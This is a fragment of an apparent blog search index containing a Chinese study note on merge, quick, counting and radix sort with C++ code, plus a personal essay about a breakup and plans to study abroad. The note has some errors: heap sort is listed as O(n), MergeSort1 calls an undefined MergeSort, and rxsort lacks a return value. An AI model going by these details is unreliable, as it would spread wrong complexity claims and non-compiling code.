            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法整理</title>
      <link href="/2021/07/23/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/"/>
      <url>/2021/07/23/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1>排序算法</h1><p>对各类排序方法整理如下：</p><table><thead><tr><th><strong>排序算法</strong></th><th><strong>时间复杂度</strong></th></tr></thead><tbody><tr><td>归并排序</td><td>Ο(nlog2n)</td></tr><tr><td>快速排序</td><td>极端Ο(n2)，最好Ο(nlog2n)</td></tr><tr><td>堆排序</td><td>Ο(n)</td></tr><tr><td>计数排序</td><td>O(n+k),k为整数的范围</td></tr><tr><td>基数排序</td><td><em><em>Ο((n + k) <em>d)</em></em> ，n指</em><em>分配</em><em>n个数要n次，k指</em><em>构建k个桶</em>*，d为位数**)</td></tr></tbody></table><h2 id="归并排序"><a class="header-anchor" href="#归并排序">¶</a><strong>归并排序</strong></h2><p>如下图，假设要对长度为n的数列A进行排序，归并排序的思想就是<strong>Divide&amp;Conquer</strong>分开并克服，首先将A着半拆分为左数列L和有数列R，然后分别对L和R进行各自的排序，最后进行L和R的合并操作。</p><p><img src="https://img2020.cnblogs.com/blog/1820479/202004/1820479-20200403104649348-448131316.png" alt="img"></p><p>在该课程里，讲师提到了归并排序用的是一种叫<strong>Two Fingers双指算法</strong>，这里我用上图的列子进行讲述：</p><ol><li>如果数列a为[20,13,7,2,12,11,9,1]，将它折半拆为左数列L：[20,13,7,2]，右数列R：[12, 11, 9, 1];</li><li>对数列L和R各自进行排序，方法用冒泡排序或其他排序手段都行;</li><li>之后用箭头（指代手指）指向数列L和R最小的元素，进行比较，并先输出这个最小的元素，如上图就是min(1,2)=1。</li><li>之后在该最小元素下移动箭头至下一个元素，将其与原来另一个数列元素进行比较，如上图就是数列R的箭头移至9, 数列L由于上一步不是最小值，所以箭头不变，则对比箭头所指元素的到min(2, 9)=2，输出结果。重复上述操作箭头到达各自数列末尾。</li></ol><p>如下图所示，这里复杂度为<strong>Ο(nlog2n)</strong>。这里可以简单的分为两块：（1）<strong>二路归并需要进行log2n次</strong>；（2）<strong>双指算法对单次二路归并进行n次箭头移动（帮助进行最小值比较操作）</strong>。因此就是nlog2n次。</p><p><img src="http://p.qpic.cn/pic_wework/1948211503/2b2dce38f298729431e797ff2f6ca2260c579caa70c3fb3a/0" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> low,<span class="keyword">int</span> mid,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="comment">//low为第1有序区的第1个元素，i指向第1个元素, mid为第1有序区的最后1个元素</span></span><br><span class="line">    <span class="keyword">int</span> i=low,j=mid+<span class="number">1</span>,k=<span class="number">0</span>; <span class="comment">//mid+1为第2有序区第1个元素，j指向第1个元素</span></span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in"><span class="keyword">new</span></span>(nothrow) <span class="keyword">int</span>[high-low+<span class="number">1</span>]; <span class="comment">//temp数组暂存合并的有序序列</span></span><br><span class="line">    <span class="keyword">if</span>(!temp)&#123; <span class="comment">//内存分配失败</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;error&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=high)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i]&lt;=arr[j]) <span class="comment">//较小的先存入temp中</span></span><br><span class="line">            temp[k++]=arr[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            temp[k++]=arr[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)<span class="comment">//若比较完之后，第一个有序区仍有剩余，则直接复制到t数组中</span></span><br><span class="line">        temp[k++]=arr[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=high)<span class="comment">//同上</span></span><br><span class="line">        temp[k++]=arr[j++];</span><br><span class="line">    <span class="keyword">for</span>(i=low,k=<span class="number">0</span>;i&lt;=high;i++,k++)<span class="comment">//将排好序的存回arr中low到high这区间</span></span><br><span class="line">arr[i]=temp[k];</span><br><span class="line">    <span class="keyword">delete</span> []temp;<span class="comment">//删除指针，由于指向的是数组，必须用delete []</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//用递归应用二路归并函数实现排序——分治法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort1</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(low&lt;high)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">MergeSort</span>(arr,low,mid);</span><br><span class="line">        <span class="built_in">MergeSort</span>(arr,mid+<span class="number">1</span>,high);</span><br><span class="line">        <span class="built_in">Merge</span>(arr,low,mid,high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用非递归应用二路归并函数实现排序——分治法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort2</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> n)</span><span class="comment">//n代表数组中元素个数，即数组最大下标是n-1&#123;</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function">int step = 1;</span></span></span><br><span class="line"><span class="comment"><span class="function">while(step&lt;n) //当元素个数不是2的幂时可能会出错，未考虑第2个序列个数不足的情况</span></span></span><br><span class="line"><span class="comment"><span class="function">&#123;</span></span></span><br><span class="line"><span class="comment"><span class="function">for(int i=0;i&lt;=n-step-1;i+=2*step)</span></span></span><br><span class="line"><span class="comment"><span class="function">Merge(arr,i,i+step-1,i+2*step-1);</span></span></span><br><span class="line"><span class="comment"><span class="function">step*=2;</span></span></span><br><span class="line"><span class="comment"><span class="function">&#125;*/</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> size</span>=<span class="number">1</span>,low,mid,high;</span><br><span class="line"><span class="keyword">while</span>(size&lt;=n<span class="number">-1</span>)&#123;</span><br><span class="line">low=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(low+size&lt;=n<span class="number">-1</span>)&#123;</span><br><span class="line">mid=low+size<span class="number">-1</span>;</span><br><span class="line">high=mid+size;</span><br><span class="line"><span class="keyword">if</span>(high&gt;n<span class="number">-1</span>)<span class="comment">//第二个序列个数不足size</span></span><br><span class="line">high=n<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">Merge</span>(arr,low,mid,high);<span class="comment">//调用归并子函数</span></span><br><span class="line">low=high+<span class="number">1</span>;<span class="comment">//下一次归并时第一关序列的下界</span></span><br><span class="line">&#125;</span><br><span class="line">size*=<span class="number">2</span>;<span class="comment">//范围扩大一倍</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="快速排序"><a class="header-anchor" href="#快速排序">¶</a>快速排序</h2><p>它是一种非常高效也很常用的排序算法，主要有三个零件：left左指针，right右指针和base基准数。举个例子如下图所示：</p><p><img src="http://p.qpic.cn/pic_wework/1948211503/4046a55350b105743a315ad7a0e8689acd1fee115ea3a730/0" alt="img"></p><ul><li>首先假设数列a为[6, 3, 7, 4, 1]，则<strong>left左指针为数列a最开始的元素</strong>6，<strong>right右指针为数列b最末端的元素</strong>1，<strong>base基准数为left左指针</strong>6（注意这个<strong>base基准数从头到尾都不改动</strong>的）。</li></ul><ol><li>先从right指向的数与base对比：</li></ol><ul><li>如果right&lt;base，则将right值替换left值，然后left向右移一位，同时right值替换为空值，且right指针位置不变，然后让left此时指的数与base对比。</li><li>如果right&gt;base，则将right值替换right值（即保持不变），然后right向左移一位，同时left值替换为空值，且left指针位置不变，然后让right此时指的数与base对比。</li></ul><ol><li>重复上述操作，直到左右指针重叠，此时就直接将base值放入重叠位置即可。</li></ol><p>总结上面的就是：<strong>先右开始对比，之后’小于则替换left并移left，然后新left对比base’或’大于则替换right并移right，然后新right对比base‘, left和right重合后用base替换</strong>。它的时间复杂度<strong>取决于base值真实在排序后的位置</strong>，如果base刚好为<strong>排序中间的位置</strong>，时间复杂度为<strong>Ο(nlog2n)</strong>，如果base为数列<strong>最大值或最小值</strong>，则为<strong>Ο(n2)</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//快速排序（从小到大）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right, vector&lt;<span class="keyword">int</span>&gt;&amp; arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(left &gt;= right)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">int</span> i, j, base, temp;</span><br><span class="line">i = left, j = right;</span><br><span class="line">base = arr[left];  <span class="comment">//取最左边的数为基准数</span></span><br><span class="line"><span class="keyword">while</span> (i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (arr[j] &gt;= base &amp;&amp; i &lt; j)</span><br><span class="line">j--;</span><br><span class="line"><span class="keyword">while</span> (arr[i] &lt;= base &amp;&amp; i &lt; j)</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line">temp = arr[i];</span><br><span class="line">arr[i] = arr[j];</span><br><span class="line">arr[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//基准数归位</span></span><br><span class="line">arr[left] = arr[i];</span><br><span class="line">arr[i] = base;</span><br><span class="line"><span class="built_in">quickSort</span>(left, i - <span class="number">1</span>, arr);<span class="comment">//递归左边</span></span><br><span class="line"><span class="built_in">quickSort</span>(i + <span class="number">1</span>, right, arr);<span class="comment">//递归右边</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计数排序"><a class="header-anchor" href="#计数排序">¶</a>计数排序</h2><p>计数排序并不基于元素的比较，而是一种<strong>利用数组下标来确定元素正确位置的算法</strong>。通过对每个数组中的每个元素进行相应的计数统计，通过计数值确定元素的正确位置的排序算法。计数排序需要知道待排序数据的取值范围，以方便申请辅助空间，这是计数排序的一个缺点。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMyLnpoaW1nLmNvbS84MC92Mi03MmYzY2NiZWUzYzA2YzYyMjRkYTgwMTcwNGY1MjVlZl8xNDQwdy5qcGc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">counting_sort</span><span class="params">(<span class="keyword">int</span> data[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span>* sorted = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">  <span class="keyword">int</span> max = data[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[i] &gt; max)</span><br><span class="line">      max = data[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span>* count = <span class="keyword">new</span> <span class="keyword">int</span>[max+<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; max+<span class="number">1</span>; ++i)</span><br><span class="line">    count[i] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 记录频次</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    count[data[i]]++;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 累加计数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= max; i++)</span><br><span class="line">    count[i] += count[i - <span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 确定最终位置</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    sorted[count[data[i]] - <span class="number">1</span>] = data[i];</span><br><span class="line">    count[data[i]]--;<span class="comment">//注意</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    data[i] = sorted[i];</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">delete</span> [] sorted;</span><br><span class="line">  <span class="keyword">delete</span> [] count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基数排序"><a class="header-anchor" href="#基数排序">¶</a>基数排序</h2><p>从低位开始，对所有数字进行排序。例如第1轮排序后，数字的个位数要有序；第2轮排序后，数字的十位数要有序，如果十位数相同的数，个位数要按照之前的相对顺序摆放；依次类推直至最高位排序完成。在对每位进行排序时，选择的排序算法一定要是<strong>稳定的排序</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">rxsort</span><span class="params">(<span class="keyword">int</span> A[],<span class="keyword">int</span> l,<span class="keyword">int</span> h,<span class="keyword">int</span> d,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span>==A||l&gt;h)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> size = h-l+<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span>* counts = <span class="keyword">new</span> <span class="keyword">int</span>[k];<span class="comment">//用于计数排序的辅助数据，详见计数排序</span></span><br><span class="line">    <span class="keyword">int</span>* temp = <span class="keyword">new</span> <span class="keyword">int</span>[size];<span class="comment">//用于存储重新排序的数组</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> pval=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//依次处理不同的位</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;d;i++)&#123;</span><br><span class="line">        <span class="comment">//counts数组清零</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;k;j++)</span><br><span class="line">            counts[j] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=l;j&lt;=h;j++)&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            1.data[j]/pval：去掉数字data[j]的后i个数，例如：</span></span><br><span class="line"><span class="comment">            当data[j]=1234,i=2时，此时pval=100,data[j]/pval=12;</span></span><br><span class="line"><span class="comment">            2.(data[j]/pval)%k：取数字data[j]/pval的最后一位数</span></span><br><span class="line"><span class="comment">            3.(int)(data[j]/pval)%k:取数字data[j]的第i位数</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            index = (<span class="keyword">int</span>)(A[j]/pval)%k;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            统计数组A中每个数字的第i位数中各个数字的频数,用于计数排序；</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            counts[index]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//计算累加频数，用户计数排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;k;j++)</span><br><span class="line">            counts[j] = counts[j] + counts[j<span class="number">-1</span>];</span><br><span class="line">        <span class="comment">//使用倒数第i+1位数对A进行排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=h;j&gt;=l;j--)&#123;</span><br><span class="line">            index = (<span class="keyword">int</span>)(A[j]/pval)%k;</span><br><span class="line">            temp[counts[index]<span class="number">-1</span>] = A[j];</span><br><span class="line">            counts[index]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将按第i为数排序后的结果保存回数组A中</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)</span><br><span class="line">            A[j+l] = temp[j];</span><br><span class="line">        <span class="comment">//更新pval</span></span><br><span class="line">        pval = pval*k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] counts;</span><br><span class="line">    <span class="keyword">delete</span>[] temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔</title>
      <link href="/2021/07/05/%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/07/05/%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>もう終わった，从未想过会这样潦草收场，曾讥笑两三个月的快餐式恋爱，以为自己不一样，看来我错了（笑）是我不理解其中苦衷吧没有真正的对与错吧，有些矛盾无法解决，分歧在相处中只会愈发显现，一段感情意味着的责任也只有身处其中才能感受到，大概都累了吧</p><p>今年的春色因你而格外明艳，感谢从我的世界走过，お元気ですか、私は元気です，脑海莫名浮现一起去看的《情书》的名场景。</p><p>it’s probably for the best，我大概无法抽出精力给一场终究不会有结果的感情吧——不久前终于下定了留学的决心，或许没有那么多时间去玩闹了吧……一念既定，万山难阻，愿走出这墙内，去外面的世界</p><p>一如今生，<br>无有也无是，<br>无痛也无乐。</p><p>佩索阿可真是个妙人，道破我此时的心理状态。似乎确凿没有感受到很多痛苦，这样的结果是我纠结后的选择，意识到不合适，大抵就应该这般快刀斩断吧</p><p>不知命运是否会让我在大学认识the one，更不知会是什么样的，不过我想，她应是能够陪我一同学习进步的吧，“绿鬓视草，红袖添香，眷属疑仙”，又甚至，她能陪我一起出国？学长学姐的事迹令人艳羡，双双赴美，只羡鸳鸯不羡仙……命运一向待我不薄，或许会遇到吧</p><p>这红酒后劲有点足，头居然这就晕了，晚安，南京</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
